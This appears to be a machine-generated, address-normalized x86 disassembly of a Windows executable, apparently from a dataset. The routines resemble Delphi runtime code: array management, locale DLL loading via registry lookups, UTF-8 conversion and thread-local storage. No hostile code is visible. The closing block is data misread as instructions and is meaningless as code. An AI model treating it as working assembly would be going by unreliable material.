add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404614
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a78
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404bac
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a90
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4055b0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404ef4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402840
sub_404ccc
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404d20
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404d18
jmp r-xdata
mov al 0x4
call sub_402840
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402840
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402724
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026e4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b40
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404980
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028e0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b40
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404d00
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404d20
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404eb8
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402704
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404980
sub_404ef4
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404eb8
pop edx
pop eax
sub_404f1c
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012f4
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404f4c
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401284
mov eax esp
mov dl 0x1
call sub_405188
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404f94
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404f4c
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_404fd0
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40128c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401294
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_404fbc
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_404fbc
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_404fbc
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_401264
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_40125c
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405188
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401284
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012dc
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40528d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_404fd0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012dc
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012d4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012dc
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012a4
push eax
call sub_40127c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405400
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404f4c
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_40545c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402704
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402704
jmp r-xdata
sub_4054bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4054f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405528
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40558c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4054bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405593
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4055b0
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4055dc
test edx edx
je sub_405598
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402840
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405680
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_40131c
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4056a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405784
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4058bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40595b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403ef8
mov eax ebx
xor edx edx
call sub_404750
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405962
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
call sub_404744
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404544
mov eax ebx
call sub_404744
push eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
inc eax
push eax
mov eax ebx
call sub_404734
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
pop ecx
pop edx
call sub_4056a8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403ef8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404544
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f4c
sub_405968
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4059ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4045d8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a06
lea eax [ ebp - 0x4 ]
call sub_4045d8
retn
mov eax ebx
call sub_4041b8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404820
mov eax ebx
call sub_4041b8
push eax
mov eax [ ebp - 0x4 ]
call sub_404744
inc eax
push eax
mov eax ebx
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
call sub_404734
pop ecx
pop edx
call sub_405784
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4045d8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404820
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404614
sub_405a0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404724
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4058bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a56
lea eax [ ebp - 0x4 ]
call sub_4045d8
retn
sub_405a5c
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040f0
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404f94
push eax
call sub_4012b4
mov ecx eax
mov edx esp
mov eax esi
call sub_403fe8
jmp r-xdata
sub_405ab4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405b1a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40127c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404168
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b60
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b21
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
xor ebx ebx
sub_405b28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405b72
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b79
retn
mov eax rw-data
call sub_4029d8
mov eax rw-data
call sub_4029d8
mov eax rw-data
call sub_4029d8
call sub_401ae8
sub_405b7c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404cc4
call sub_402f6c
test al al
je r-xdata
call sub_403060
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401334
mov [ rw-data ] eax
call sub_40132c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402f9c
call sub_4012a4
call sub_405ab4
mov [ rw-data ] eax
call sub_40132c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012a4
call sub_405ab4
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401324
mov [ rw-data ] eax
sub_405c84
push ebx
call sub_405c7c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405c70
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403e68
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403e68
sub_405cc8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405c84
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405d14
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405c50
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405d08
mov edx rw-data
mov eax ebx
call sub_403bbc
pop ebx
retn
sub_405d58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d84
retn
sub_405db4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405dd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405df5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405dfc
retn
sub_405e08
or al 0x5e
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
or [ esi + 0x40 ] bl
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov bl 0x47
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
jb r-xdata
jb r-xdata
je r-xdata
mov bl 0x47
add [ ebx + 0x5025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov bl 0x47
sar bh 0x25
push esp
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx + 0x4825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x4425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x4025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x3825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x3425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x3025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x2825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x2425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x2025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x1825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x1425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x1025ffc0 ] cl
mov bl 0x47
add [ ebx + 0xc25ffc0 ] cl
mov bl 0x47
